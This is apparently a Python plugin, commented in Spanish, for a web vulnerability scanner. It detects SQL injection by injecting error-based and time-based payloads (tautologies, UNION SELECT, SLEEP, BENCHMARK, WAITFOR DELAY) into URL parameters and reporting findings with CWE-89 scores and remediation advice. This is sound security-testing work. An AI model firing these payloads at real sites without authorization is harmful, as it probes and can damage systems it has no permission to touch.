"""
Plugin de detección de SQL Injection (Time-based y Error-based)
"""
import asyncio
import time
import re
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from plugins.base_plugin import BasePlugin, Finding
from config.settings import PLUGIN_CONFIG
from utils.logger import get_logger

logger = get_logger(__name__)

class SQLiScanner(BasePlugin):
    """Scanner avanzado de SQL Injection"""
    
    def __init__(self):
        super().__init__(
            name="SQL Injection Scanner",
            description="Detecta vulnerabilidades SQLi (Time-based y Error-based)"
        )
        self.config = PLUGIN_CONFIG["sqli"]
        self.time_delay = self.config["time_based_delay"]
        
        # Payloads Error-based
        self.error_payloads = [
            "'", "\"", "' OR '1'='1", "' OR '1'='1' --", 
            "' OR '1'='1' /*", "admin' --", "admin' #",
            "' UNION SELECT NULL--", "' AND 1=2--",
            "1' AND '1'='1", "1' AND '1'='2"
        ]
        
        # Payloads Time-based
        self.time_payloads = [
            f"' OR SLEEP({self.time_delay})--",
            f"' OR BENCHMARK(10000000,MD5('A'))--",
            f"'; WAITFOR DELAY '00:00:{self.time_delay:02d}'--",
            f"' AND SLEEP({self.time_delay}) AND '1'='1",
            f"1' AND SLEEP({self.time_delay})--",
        ]
    
    async def scan(self, target_url: str, client, **kwargs) -> List[Finding]:
        """Escanea URL en busca de SQLi"""
        logger.info(f"[SQLi] Iniciando escaneo en {target_url}")
        
        # Obtener URLs descubiertas por el crawler
        urls_to_scan = kwargs.get('discovered_urls', [target_url])
        
        if not urls_to_scan:
            urls_to_scan = [target_url]
        
        logger.info(f"[SQLi] Escaneando {len(urls_to_scan)} URLs...")
        
        for url in urls_to_scan:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            if not params:
                continue
            
            await self._scan_url_params(url, params, client)
        
        logger.info(f"[SQLi] Escaneo completado. Vulnerabilidades: {len(self.findings)}")
        return self.findings
    
    async def _scan_url_params(self, url: str, params: dict, client):
        """Escanea parámetros de una URL específica"""
        
        # Escanear cada parámetro
        tasks = []
        for param_name in params.keys():
            tasks.append(self._scan_parameter(url, param_name, client))
        
        await asyncio.gather(*tasks)
    
    async def _scan_parameter(self, url: str, param_name: str, client):
        """Escanea un parámetro específico"""
        
        # 1. Error-based SQLi
        await self._test_error_based(url, param_name, client)
        
        # 2. Time-based SQLi
        await self._test_time_based(url, param_name, client)
    
    async def _test_error_based(self, url: str, param_name: str, client):
        """Prueba SQLi basada en errores"""
        
        for payload in self.error_payloads:
            test_url = self._inject_payload(url, param_name, payload)
            
            response = await client.get(test_url)
            self.stats["requests_sent"] += 1
            
            if not response:
                continue
            
            # Buscar patrones de error SQL
            for pattern in self.config["error_patterns"]:
                if re.search(pattern, response.text, re.IGNORECASE):
                    finding = Finding(
                        plugin_name=self.name,
                        severity="HIGH",
                        title=f"SQL Injection (Error-based) en parámetro '{param_name}'",
                        description=f"El parámetro '{param_name}' es vulnerable a SQL Injection. "
                                  f"Se detectó el error: '{pattern}'",
                        url=test_url,
                        parameter=param_name,
                        payload=payload,
                        request=f"GET {test_url}",
                        response=response.text[:500],
                        remediation="Usar prepared statements o ORM. Validar y sanitizar entradas.",
                        cwe="CWE-89",
                        cvss_score=8.6
                    )
                    self.add_finding(finding)
                    return  # Encontrado, salir
    
    async def _test_time_based(self, url: str, param_name: str, client):
        """Prueba SQLi basada en tiempo (Blind SQLi)"""
        
        # Primero, obtener tiempo de respuesta normal
        baseline_times = []
        for _ in range(3):
            start = time.time()
            response = await client.get(url)
            elapsed = time.time() - start
            baseline_times.append(elapsed)
        
        baseline_avg = sum(baseline_times) / len(baseline_times)
        
        # Probar payloads con delay
        for payload in self.time_payloads:
            test_url = self._inject_payload(url, param_name, payload)
            
            start = time.time()
            response = await client.get(test_url)
            elapsed = time.time() - start
            self.stats["requests_sent"] += 1
            
            if not response:
                continue
            
            # Si el tiempo de respuesta es significativamente mayor
            if elapsed >= (baseline_avg + self.time_delay - 1):
                finding = Finding(
                    plugin_name=self.name,
                    severity="HIGH",
                    title=f"SQL Injection (Time-based Blind) en parámetro '{param_name}'",
                    description=f"El parámetro '{param_name}' es vulnerable a Blind SQL Injection. "
                                f"Delay detectado: {elapsed:.2f}s vs baseline {baseline_avg:.2f}s",
                    url=test_url,
                    parameter=param_name,
                    payload=payload,
                    request=f"GET {test_url}",
                    response=f"Response time: {elapsed:.2f}s",
                    remediation="Usar prepared statements. Implementar rate limiting.",
                    cwe="CWE-89",
                    cvss_score=8.2
                )
                self.add_finding(finding)
                return
    
    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inyecta payload en un parámetro de la URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Reemplazar valor del parámetro con payload
        params[param_name] = [payload]
        
        # Reconstruir URL
        new_query = urlencode(params, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        
        return urlunparse(new_parsed)